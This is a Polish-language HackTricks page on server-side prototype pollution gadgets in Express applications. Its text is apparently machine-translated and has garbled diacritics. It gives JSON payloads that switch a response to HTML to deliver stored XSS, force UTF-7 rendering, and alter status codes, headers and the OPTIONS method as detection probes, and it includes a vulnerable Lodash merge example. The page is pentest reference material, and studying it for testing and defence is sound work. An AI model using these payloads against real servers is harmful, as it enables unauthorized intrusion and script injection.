# Gad偶ety do zanieczyszczania prototyp贸w Express

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, kt贸ra oferuje **darmowe** funkcje do sprawdzania, czy firma lub jej klienci zostali **skompromitowani** przez **zoliwe oprogramowanie kradnce dane**.

Ich g贸wnym celem WhiteIntel jest zwalczanie przej kont i atak贸w ransomware wynikajcych z zoliwego oprogramowania kradncego informacje.

Mo偶esz odwiedzi ich stron internetow i wypr贸bowa ich silnik za **darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

***

## Serwowanie odpowiedzi XSS

**Aby uzyska wicej informacji** [**zapoznaj si z oryginalnym badaniem**](https://portswigger.net/research/server-side-prototype-pollution)

### Zmie typ zawartoci JSON na HTML

W aplikacji Express u偶ywajcej **odpowiedzi z typem zawartoci JSON** i odzwierciedlajc JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
W tych przypadkach XSS zwykle nie jest mo偶liwe przy u偶yciu typu zawartoci JSON. Jednak偶e, dziki zanieczyszczeniu prototypu mo偶emy **wprowadzi w bd Express, aby zwr贸ci odpowied藕 w formacie HTML.** Ta podatno polega na tym, 偶e aplikacja u偶ywa **`res.send(obj)`** i korzysta z analizatora treci z typem zawartoci application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Poprzez **zanieczyszczanie** waciwoci **`body`** i **`_body`**, mo偶na spowodowa, 偶e **Express bdzie serwowa zawarto typu HTML** i odzwierciedla waciwo `_body`, co skutkuje przechowywaniem XSS.

### Renderowanie UTF7

Mo偶liwe jest sprawienie, aby express **renderowa zawarto UTF-7 za pomoc**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Bezpieczne techniki skanowania

### Przestrzenie JSON

Nastpujcy PP spowoduje, 偶e atrybuty wewntrz obiektu JSON bd miay dodatkow spacj, kt贸ra nie zepsuje funkcjonalnoci:
```json
{"__proto__":{"json spaces": " "}}
```
Nastpnie odbite JSON bdzie wyglda tak:
```json
{"foo":  "bar"} -- Note the extra space
```
### Ujawnione Nag贸wki

Nastpny gad偶et PP sprawi, 偶e serwer wyle z powrotem nag贸wek HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Wymaga zainstalowania moduu **CORS**

### **Metoda OPTIONS**

Z nastpujcym adunkiem, jest mo偶liwe **ukrycie metody w odpowiedzi OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Mo偶liwe jest zmiana **zwr贸conego kodu stanu** za pomoc nastpujcego adunku PP:
```json
{"__proto__":{"status":510}}
```
### Bd

Gdy przypiszesz prototypowi warto pierwotn, tak jak cig znak贸w, powstaje **operacja no-op, poniewa偶 prototyp musi by obiektem**. Jeli spr贸bujesz przypisa obiekt prototypu do samego `Object.prototype`, to spowoduje to **wygenerowanie wyjtku**. Mo偶emy wykorzysta te dwa zachowania do **wykrycia, czy zanieczyszczenie prototypu zakoczyo si sukcesem**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Odbita Warto

Gdy aplikacja zawiera obiekt w odpowiedzi, stworzenie atrybutu z **niezwyk nazw obok `__proto__`** mo偶e by pouczajce. W szczeg贸lnoci, jeli w odpowiedzi zwracany jest **tylko niezwyky atrybut**, mo偶e to wskazywa na podatno aplikacji:
```json
{"unusualName":"value","__proto__":"test"}
```
Ponadto, w scenariuszach, w kt贸rych u偶ywana jest biblioteka tak jak Lodash, ustawienie waciwoci zar贸wno poprzez zanieczyszczenie prototypu (PP), jak i bezporednio wewntrz obiektu oferuje kolejne podejcie diagnostyczne. Jeli taka waciwo zostanie pominita z odpowiedzi, sugeruje to, 偶e Lodash sprawdza istnienie waciwoci w docelowym obiekcie przed scaleniem:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## R贸偶ne

### Zezw贸l na kropki

Istnieje opcja w Express, kt贸ra pozwala **tworzy obiekty z parametr贸w cigu zapytania**.\
Zdecydowanie mo偶na jej u偶y w acuchu bd贸w do wykorzystania podatnoci na **zanieczyszczenie prototypu**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` tworzy obiekt w Node.**

## Odnoniki

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana **dark-webem**, kt贸ra oferuje **darmowe** funkcjonalnoci do sprawdzenia, czy firma lub jej klienci zostali **skompromitowani** przez **zoliwe oprogramowanie kradnce informacje**.

Ich g贸wnym celem WhiteIntel jest zwalczanie przej kont i atak贸w ransomware wynikajcych z zoliwego oprogramowania kradncego informacje.

Mo偶esz odwiedzi ich stron internetow i wypr贸bowa ich silnik za **darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
